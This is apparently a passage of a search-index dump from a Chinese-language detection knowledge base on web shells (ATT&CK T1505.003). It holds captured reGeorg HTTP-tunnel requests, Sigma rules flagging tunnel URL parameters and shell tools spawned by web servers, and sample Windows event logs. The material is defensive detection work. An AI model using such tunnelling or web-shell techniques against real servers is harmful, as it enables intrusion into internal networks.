HttpOnly X-STATUS: OK Content-Type: text/html Content-Length: 0 Date: Thu, 17 Dec 2020 16:44:45 GMT \u4e0b\u4e00\u6761\u6d41cmd=read,\u4ee3\u8868\u662f\u53bb\u8bbf\u95ee\u5185\u7f51\u7684\u5185\u5bb9 Accept-Encoding: identity\u8bf7\u6c42\u7684HTTP\u5934\u901a\u544a\u5176\u5185\u5bb9\u7f16\u7801\uff0c\u53ea\u8981\u6ca1\u6709\u88ab\u660e\u786e\u7981\u6b62 \u670d\u52a1\u5668\u5c31\u4e0d\u80fd\u53d1\u56de406 Not Acceptable\u9519\u8bef \u54cd\u5e94\u5305\u5934\uff1aTransfer-Encoding: chunked\u4ee3\u8868\u662f\u5206\u5757\u4f20\u8f93 POST /tunnel.jsp?cmd=read HTTP/1.1 Host: 182.x.x.x:8080 Accept-Encoding: identity Content-Length: 0 X-CMD: READ Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly Connection: Keep-Alive User-Agent: python-urllib3/1.26.2 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 X-STATUS: OK Content-Type: text/html Transfer-Encoding: chunked Date: Thu, 17 Dec 2020 16:44:45 GMT \u63a5\u4e0b\u6765\u8fd9\u6761\u6d41\u5c31\u662fcmd=forward\uff0c\u8f6c\u53d1\u5230\u5185\u7f51 POST /tunnel.jsp?cmd=forward HTTP/1.1 Host: 182.92.73.106:8080 Accept-Encoding: identity Content-Length: 83 Content-Type: application/octet-stream X-CMD: FORWARD Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly Connection: Keep-Alive User-Agent: python-urllib3/1.26.2 GET /login.php HTTP/1.1 Host: 172.17.0.2 User-Agent: curl/7.68.0 Accept: */* HTTP/1.1 200 OK Server: Apache-Coyote/1.1 X-STATUS: OK Content-Type: text/html Content-Length: 0 Date: Thu, 17 Dec 2020 16:44:45 GMT \u6700\u540e\u5c31\u662fcmd=disconnect\u5173\u95ed\u8fde\u63a5 POST /tunnel.jsp?cmd=disconnect HTTP/1.1 Host: 182.x.x.x:8080 Accept-Encoding: identity X-CMD: DISCONNECT Cookie: JSESSIONID=C71AAD9AFD48C0E4796514EF6835F2B4; Path=/; HttpOnly User-Agent: python-urllib3/1.26.2 HTTP/1.1 200 OK Server: Apache-Coyote/1.1 X-STATUS: OK Content-Type: text/html Content-Length: 0 Date: Thu, 17 Dec 2020 16:44:45 GMT \u5185\u7f51\u670d\u52a1\u5668 \u5728\u5185\u7f51\u670d\u52a1\u5668\u4e0a\u6293\u5305,\u770b\u5230\u670d\u52a1\u5668A\u5411\u5185\u7f51\u8bf7\u6c42\u4e86login.php GET /login.php HTTP/1.1 Host: 172.17.0.2 User-Agent: curl/7.68.0 Accept: */* HTTP/1.1 200 OK Date: Thu, 17 Dec 2020 16:53:17 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9-1ubuntu4.25 Set-Cookie: PHPSESSID=65ehap87lgj2sk84poopt0aep3; path=/ Expires: Tue, 23 Jun 2009 12:00:00 GMT Cache-Control: no-cache, must-revalidate Pragma: no-cache Set-Cookie: PHPSESSID=65ehap87lgj2sk84poopt0aep3; path=/; httponly Set-Cookie: security=impossible; httponly Vary: Accept-Encoding Content-Length: 1567 Content-Type: text/html;charset=utf-8 <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> \u4ee5\u4e0a\u5185\u5bb9\u6458\u81ea https://cloud.tencent.com/developer/article/1779195","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#sigma","text":"title: Webshell ReGeorg HTTP\u96a7\u9053\u68c0\u6d4b status: \u6d4b\u8bd5\u72b6\u6001 description: \u901a\u8fc7\u8bf7\u6c42\u8def\u5f84\u5185\u7684\u5185\u5bb9\u8fdb\u884c\u68c0\u6d4b\uff0c\u57fa\u4e8eurl\u53c2\u6570\u68c0\u6d4b references: - https://cloud.tencent.com/developer/article/1779195 - https://github.com/sensepost/reGeorg logsource: category: webserver detection: selection: uri_query|contains: #url\u4e2d\u5305\u542b\u6b64\u7c7b\u7279\u5f81 - '*cmd=read*' - '*connect&target*' - '*cmd=connect*' - '*cmd=disconnect*' - '*cmd=forward*' filter: referer: null useragent: null method: POST condition: selection and filter fields: - uri_query - referer - method - useragent falsepositives: - web applications that use the same URL parameters as ReGeorg level: high tags: - attack.persistence - attack.t1100 - attack.t1505.003","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_6","text":"\u591a\u6570\u5b89\u5168\u8bbe\u5907\u5df2\u652f\u6301\u68c0\u6d4b\u6b64\u7c7b\u96a7\u9053\u884c\u4e3a\u3002","title":"\u5907\u6ce8"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-Regeorg-HTTP%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B/#_7","text":"MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ reGeorg\u642d\u5efaHTTP\u96a7\u9053\u548c\u6d41\u91cf\u5206\u6790 https://cloud.tencent.com/developer/article/1779195","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/","text":"T1505-003-web\u670d\u52a1\u4ea7\u751f\u7684\u53ef\u7591\u8fdb\u7a0b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49) \u6d4b\u8bd5\u6848\u4f8b \u6b64\u68c0\u6d4b\u65b9\u6cd5\u5c06\u67e5\u627e\u5e38\u89c1\u7684Web\u670d\u52a1\u5668\u8fdb\u7a0b\u540d\u79f0\uff0c\u5e76\u6807\u8bc6\u4f7f\u7528\u811a\u672c\u8bed\u8a00\uff08cmd\uff0cpowershell\uff0cwscript\uff0ccscript\uff09\uff0c\u8bf7\u6ce8\u610f\u5e38\u89c1\u7684\u521d\u59cb\u914d\u7f6e\u6587\u4ef6\u547d\u4ee4\uff08net\\net1\\whoami\\ping\\ipconfig\uff09\u6216\u7ba1\u7406\u547d\u4ee4\uff08sc\uff09\u542f\u52a8\u7684\u4efb\u4f55\u8fdb\u7a0b\u3002\u770b\u5230\u6b64\u6d3b\u52a8\u5e76\u4e0d\u610f\u5473\u7740\u60a8\u7684\u670d\u52a1\u5668\u7acb\u5373\u5b58\u5728\u53ef\u7591\u884c\u4e3a\uff0c\u56e0\u6b64\u60a8\u9700\u8981\u81ea\u5df1\u8c03\u6574\u68c0\u6d4b\u8bed\u53e5\uff0c\u4ee5\u4fbf\u8be5\u68c0\u6d4b\u65b9\u6cd5\u9002\u5e94\u60a8\u7684web\u5e94\u7528\u73af\u5883\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows\u3001sysmon\u65e5\u5fd7\u3001\u4ee5\u53ca\u5176\u4ed6\u53ef\u8bb0\u5f55\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7684EDR\u4ea7\u54c1 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 - <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"> - <System> <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /> <EventID>4688</EventID> <Version>2</Version> <Level>0</Level> <Task>13312</Task> <Opcode>0</Opcode> <Keywords>0x8020000000000000</Keywords> <TimeCreated SystemTime=\"2015-11-12T02:24:52.377352500Z\" /> <EventRecordID>2814</EventRecordID> <Correlation /> <Execution ProcessID=\"4\" ThreadID=\"400\" /> <Channel>Security</Channel> <Computer>WIN-GG82ULGC9GO.contoso.local</Computer> <Security /> </System> - <EventData> <Data Name=\"SubjectUserSid\">S-1-5-18</Data> <Data Name=\"SubjectUserName\">WIN-GG82ULGC9GO$</Data> <Data Name=\"SubjectDomainName\">CONTOSO</Data> <Data Name=\"SubjectLogonId\">0x3e7</Data> <Data Name=\"NewProcessId\">0x2bc</Data> <Data Name=\"NewProcessName\">C:\\\\Windows\\\\System32\\\\rundll32.exe</Data> <Data Name=\"TokenElevationType\">%%1938</Data> <Data Name=\"ProcessId\">0xe74</Data> <Data Name=\"CommandLine\" /> <Data Name=\"TargetUserSid\">S-1-5-21-1377283216-344919071-3415362939-1104</Data> <Data Name=\"TargetUserName\">dadmin</Data> <Data Name=\"TargetDomainName\">CONTOSO</Data> <Data Name=\"TargetLogonId\">0x4a5af0</Data> <Data Name=\"ParentProcessName\">C:\\\\Windows\\\\explorer.exe</Data> <Data Name=\"MandatoryLabel\">S-1-16-8192</Data> </EventData> </Event> \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: web\u670d\u52a1\u4ea7\u751f\u7684\u53ef\u7591\u8fdb\u7a0b status: experimental #\u6d4b\u8bd5\u72b6\u6001 description: Web\u670d\u52a1\u5668\u4ea7\u751f\u7684\u53ef\u7591\u7684shell\u8fdb\u7a0b\uff0c\u53ef\u80fd\u662f\u6210\u529f\u653e\u7f6eWeb shell\u6216\u5176\u4ed6\u653b\u51fb\u7684\u7ed3\u679c logsource: category: process_creation #\u8fdb\u7a0b\u521b\u5efa product: windows #\u6570\u636e\u6e90\uff0cwindows detection: selection: ParentImage: - '*\\w3wp.exe' - '*\\httpd.exe' - '*\\nginx.exe' - '*\\php-cgi.exe' - '*\\tomcat.exe' - '*\\sqlservr.exe' Image: - '*\\cmd.exe' - '*\\sh.exe' - '*\\bash.exe' - '*\\powershell.exe' - '*\\bitsadmin.exe' - '*\\cscript.exe' - '*\\wscript.exe' - '*\\net.exe' - '*\\net1.exe' - '*\\ping.exe' - '*\\whoami.exe' condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.persistence - attack.t1505.003 - attack.privilege_escalation # an old one - attack.t1190 falsepositives: - \u7279\u5b9a\u7684web\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5408\u6cd5\u5730\u6d3e\u751fshell\u8fdb\u7a0b\uff0c\u5982ipconfig\u3001whoami\u7b49\u8fdb\u7a0b\uff0c\u5728\u90e8\u5206\u5ba2\u6237\u4fa7\uff0c\u53d1\u73b0\u6b64\u4e24\u8fdb\u7a0b\u9891\u7e41\u88ab\u8c03\u7528\uff0c\u5176\u4e3b\u673a\u5e76\u65e0\u5f02\u5e38\u3002 level: high \u5907\u6ce8 \u6574\u4f53\u68c0\u6d4b\u601d\u8def\uff0c\u653b\u51fb\u8005\u901a\u8fc7webshell\u6267\u884c\u4e00\u4e9b\u4fe1\u606f\u6536\u96c6\u7684\u547d\u4ee4\uff0c\u5982ipconfig\u7b49\u547d\u4ee4\u3002\u6b64\u7c7b\u884c\u4e3a\u5728windows\u65e5\u5fd7\u4e0a\u7684\u8868\u73b0\u5f62\u5f0f\u4e3a\uff0c\u7528\u6237\u8c03\u7528\u4e86\u5e38\u89c1\u7684\u4e2d\u95f4\u4ef6\u7684\u8fdb\u7a0b\uff0c\u6267\u884c\u4e86\u67d0\u4e9b\u547d\u4ee4\u3002\u6b64\u89c4\u5219\u68c0\u6d4b\u601d\u8def\u4fbf\u662f\u6765\u6e90\u4e8e\u6b64\uff0c\u4ec5\u4ec5\u9002\u7528\u4e8ewindows\u5e73\u53f0\uff0c\u53ef\u81ea\u884c\u6dfb\u52a0\u5e38\u89c1\u7684\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u6216\u8005\u5176\u4ed6\u76ee\u7684\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4e0d\u65ad\u5b8c\u5584\u89c4\u5219\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ Web\u670d\u52a1\u5668\u6267\u884c\u53ef\u7591\u5e94\u7528\u7a0b\u5e8f https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/Webserver%20Executing%20Suspicious%20Applications.md","title":"T1505-003-web\u670d\u52a1\u4ea7\u751f\u7684\u53ef\u7591\u8fdb\u7a0b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#t1505-003-web","text":"","title":"T1505-003-web\u670d\u52a1\u4ea7\u751f\u7684\u53ef\u7591\u8fdb\u7a0b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49)","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_1","text":"\u6b64\u68c0\u6d4b\u65b9\u6cd5\u5c06\u67e5\u627e\u5e38\u89c1\u7684Web\u670d\u52a1\u5668\u8fdb\u7a0b\u540d\u79f0\uff0c\u5e76\u6807\u8bc6\u4f7f\u7528\u811a\u672c\u8bed\u8a00\uff08cmd\uff0cpowershell\uff0cwscript\uff0ccscript\uff09\uff0c\u8bf7\u6ce8\u610f\u5e38\u89c1\u7684\u521d\u59cb\u914d\u7f6e\u6587\u4ef6\u547d\u4ee4\uff08net\\net1\\whoami\\ping\\ipconfig\uff09\u6216\u7ba1\u7406\u547d\u4ee4\uff08sc\uff09\u542f\u52a8\u7684\u4efb\u4f55\u8fdb\u7a0b\u3002\u770b\u5230\u6b64\u6d3b\u52a8\u5e76\u4e0d\u610f\u5473\u7740\u60a8\u7684\u670d\u52a1\u5668\u7acb\u5373\u5b58\u5728\u53ef\u7591\u884c\u4e3a\uff0c\u56e0\u6b64\u60a8\u9700\u8981\u81ea\u5df1\u8c03\u6574\u68c0\u6d4b\u8bed\u53e5\uff0c\u4ee5\u4fbf\u8be5\u68c0\u6d4b\u65b9\u6cd5\u9002\u5e94\u60a8\u7684web\u5e94\u7528\u73af\u5883\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_2","text":"windows\u3001sysmon\u65e5\u5fd7\u3001\u4ee5\u53ca\u5176\u4ed6\u53ef\u8bb0\u5f55\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7684EDR\u4ea7\u54c1","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_4","text":"- <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"> - <System> <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /> <EventID>4688</EventID> <Version>2</Version> <Level>0</Level> <Task>13312</Task> <Opcode>0</Opcode> <Keywords>0x8020000000000000</Keywords> <TimeCreated SystemTime=\"2015-11-12T02:24:52.377352500Z\" /> <EventRecordID>2814</EventRecordID> <Correlation /> <Execution ProcessID=\"4\" ThreadID=\"400\" /> <Channel>Security</Channel> <Computer>WIN-GG82ULGC9GO.contoso.local</Computer> <Security /> </System> - <EventData> <Data Name=\"SubjectUserSid\">S-1-5-18</Data> <Data Name=\"SubjectUserName\">WIN-GG82ULGC9GO$</Data> <Data Name=\"SubjectDomainName\">CONTOSO</Data> <Data Name=\"SubjectLogonId\">0x3e7</Data> <Data Name=\"NewProcessId\">0x2bc</Data> <Data Name=\"NewProcessName\">C:\\\\Windows\\\\System32\\\\rundll32.exe</Data> <Data Name=\"TokenElevationType\">%%1938</Data> <Data Name=\"ProcessId\">0xe74</Data> <Data Name=\"CommandLine\" /> <Data Name=\"TargetUserSid\">S-1-5-21-1377283216-344919071-3415362939-1104</Data> <Data Name=\"TargetUserName\">dadmin</Data> <Data Name=\"TargetDomainName\">CONTOSO</Data> <Data Name=\"TargetLogonId\">0x4a5af0</Data> <Data Name=\"ParentProcessName\">C:\\\\Windows\\\\explorer.exe</Data> <Data Name=\"MandatoryLabel\">S-1-16-8192</Data> </EventData> </Event>","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#sigma","text":"title: web\u670d\u52a1\u4ea7\u751f\u7684\u53ef\u7591\u8fdb\u7a0b status: experimental #\u6d4b\u8bd5\u72b6\u6001 description: Web\u670d\u52a1\u5668\u4ea7\u751f\u7684\u53ef\u7591\u7684shell\u8fdb\u7a0b\uff0c\u53ef\u80fd\u662f\u6210\u529f\u653e\u7f6eWeb shell\u6216\u5176\u4ed6\u653b\u51fb\u7684\u7ed3\u679c logsource: category: process_creation #\u8fdb\u7a0b\u521b\u5efa product: windows #\u6570\u636e\u6e90\uff0cwindows detection: selection: ParentImage: - '*\\w3wp.exe' - '*\\httpd.exe' - '*\\nginx.exe' - '*\\php-cgi.exe' - '*\\tomcat.exe' - '*\\sqlservr.exe' Image: - '*\\cmd.exe' - '*\\sh.exe' - '*\\bash.exe' - '*\\powershell.exe' - '*\\bitsadmin.exe' - '*\\cscript.exe' - '*\\wscript.exe' - '*\\net.exe' - '*\\net1.exe' - '*\\ping.exe' - '*\\whoami.exe' condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.persistence - attack.t1505.003 - attack.privilege_escalation # an old one - attack.t1190 falsepositives: - \u7279\u5b9a\u7684web\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u5408\u6cd5\u5730\u6d3e\u751fshell\u8fdb\u7a0b\uff0c\u5982ipconfig\u3001whoami\u7b49\u8fdb\u7a0b\uff0c\u5728\u90e8\u5206\u5ba2\u6237\u4fa7\uff0c\u53d1\u73b0\u6b64\u4e24\u8fdb\u7a0b\u9891\u7e41\u88ab\u8c03\u7528\uff0c\u5176\u4e3b\u673a\u5e76\u65e0\u5f02\u5e38\u3002 level: high","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_6","text":"\u6574\u4f53\u68c0\u6d4b\u601d\u8def\uff0c\u653b\u51fb\u8005\u901a\u8fc7webshell\u6267\u884c\u4e00\u4e9b\u4fe1\u606f\u6536\u96c6\u7684\u547d\u4ee4\uff0c\u5982ipconfig\u7b49\u547d\u4ee4\u3002\u6b64\u7c7b\u884c\u4e3a\u5728windows\u65e5\u5fd7\u4e0a\u7684\u8868\u73b0\u5f62\u5f0f\u4e3a\uff0c\u7528\u6237\u8c03\u7528\u4e86\u5e38\u89c1\u7684\u4e2d\u95f4\u4ef6\u7684\u8fdb\u7a0b\uff0c\u6267\u884c\u4e86\u67d0\u4e9b\u547d\u4ee4\u3002\u6b64\u89c4\u5219\u68c0\u6d4b\u601d\u8def\u4fbf\u662f\u6765\u6e90\u4e8e\u6b64\uff0c\u4ec5\u4ec5\u9002\u7528\u4e8ewindows\u5e73\u53f0\uff0c\u53ef\u81ea\u884c\u6dfb\u52a0\u5e38\u89c1\u7684\u7528\u4e8e\u4fe1\u606f\u6536\u96c6\u6216\u8005\u5176\u4ed6\u76ee\u7684\u7684\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u4e0d\u65ad\u5b8c\u5584\u89c4\u5219\u3002","title":"\u5907\u6ce8"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-web%E6%9C%8D%E5%8A%A1%E4%BA%A7%E7%94%9F%E7%9A%84%E5%8F%AF%E7%96%91%E8%BF%9B%E7%A8%8B/#_7","text":"MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ Web\u670d\u52a1\u5668\u6267\u884c\u53ef\u7591\u5e94\u7528\u7a0b\u5e8f https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/Webserver%20Executing%20Suspicious%20Applications.md","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1505-003-windows%E4%B8%8Bwebshell%E6%A3%80%E6%B5%8B/","text":"T1505-003-windows\u4e0bwebshell\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c06\u5e26\u6709Web Shell\u7684\u540e\u95e8Web\u670d\u52a1\u5668\u7528\u4e8e\u5efa\u7acb\u5bf9\u7cfb\u7edf\u7684\u6301\u4e45\u8bbf\u95ee\u3002Web Shell\u662f\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\u7684Web\u811a\u672c\uff0c\u4ee5\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u8fdb\u5165\u7f51\u7edc\u7684\u7f51\u5173\u3002Web shell\u7a0b\u5e8f\u53ef\u4ee5\u5728\u6258\u7ba1Web\u670d\u52a1\u5668\u7684\u7cfb\u7edf\u4e0a\u63d0\u4f9b\u4e00\u7ec4\u8981\u6267\u884c\u7684\u529f\u80fd\u6216\u4e00\u4e2a\u547d\u4ee4\u884c\u754c\u9762\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWeb Shell\u53ef\u80fd\u8fd8\u5177\u6709\u7528\u4e8e\u4e0eWeb\u670d\u52a1\u5668\u5bf9\u8bdd\u7684\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f(\u5982\u83dc\u5200\u3001\u51b0\u874e\u3001\u54e5\u65af\u62c9\u7b49) ReGeorg\u7b80\u4ecb webshell\u5c31\u662f\u4ee5asp\u3001php\u3001jsp\u6216\u8005cgi\u7b49\u7f51\u9875\u6587\u4ef6\u5f62\u5f0f\u5b58\u5728\u7684\u4e00\u79cd\u4ee3\u7801\u6267\u884c\u73af\u5883\uff0c\u4e5f\u53ef\u4ee5\u5c06\u5176\u79f0\u505a\u4e3a\u4e00\u79cd\u7f51\u9875\u540e\u95e8\u3002\u9ed1\u5ba2\u5728\u5165\u4fb5\u4e86\u4e00\u4e2a\u7f51\u7ad9\u540e\uff0c\u901a\u5e38\u4f1a\u5c06asp\u6216php\u540e\u95e8\u6587\u4ef6\u4e0e\u7f51\u7ad9\u670d\u52a1\u5668WEB\u76ee\u5f55\u4e0b\u6b63\u5e38\u7684\u7f51\u9875\u6587\u4ef6\u6df7\u5728\u4e00\u8d77\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528\u6d4f\u89c8\u5668\u6765\u8bbf\u95eeasp\u6216\u8005php\u540e\u95e8\uff0c\u5f97\u5230\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u73af\u5883\uff0c\u4ee5\u8fbe\u5230\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u76ee\u7684\u3002 \u987e\u540d\u601d\u4e49\uff0c\u201cweb\u201d\u7684\u542b\u4e49\u662f\u663e\u7136\u9700\u8981\u670d\u52a1\u5668\u5f00\u653eweb\u670d\u52a1\uff0c\u201cshell\u201d\u7684\u542b\u4e49\u662f\u53d6\u5f97\u5bf9\u670d\u52a1\u5668\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u64cd\u4f5c\u6743\u9650\u3002webshell\u5e38\u5e38\u88ab\u79f0\u4e3a\u5165\u4fb5\u8005\u901a\u8fc7\u7f51\u7ad9\u7aef\u53e3\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u7684\u67d0\u79cd\u7a0b\u5ea6\u4e0a\u64cd\u4f5c\u7684\u6743\u9650\u3002\u7531\u4e8ewebshell\u5176\u5927\u591a\u662f\u4ee5\u52a8\u6001\u811a\u672c\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u4e5f\u6709\u4eba\u79f0\u4e4b\u4e3a\u7f51\u7ad9\u7684\u540e\u95e8\u5de5\u5177\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 windows\u3001sysmon\u65e5\u5fd7\u3001\u4ee5\u53ca\u5176\u4ed6\u53ef\u8bb0\u5f55\u8fdb\u7a0b\u3001\u547d\u4ee4\u884c\u53c2\u6570\u7684EDR\u4ea7\u54c1 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 